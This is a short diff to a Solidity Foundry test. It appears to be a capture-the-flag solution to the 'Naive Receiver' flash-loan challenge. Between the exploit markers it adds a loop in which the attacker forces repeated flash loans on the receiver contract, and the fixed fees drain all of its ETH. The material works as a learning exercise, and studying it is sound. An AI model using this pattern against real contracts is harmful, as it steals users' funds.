@@ -48,6 +48,16 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
+        uint256 fee = naiveReceiverLenderPool.fixedFee();
+
+        vm.startPrank(attacker);
+        while (true) {
+            uint256 loanAmount = address(flashLoanReceiver).balance - fee;
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), loanAmount);
+
+            // if no more ETH, break out of while loop
+            if (address(flashLoanReceiver).balance == 0) break;
+        }
 
         /**
          * EXPLOIT END *
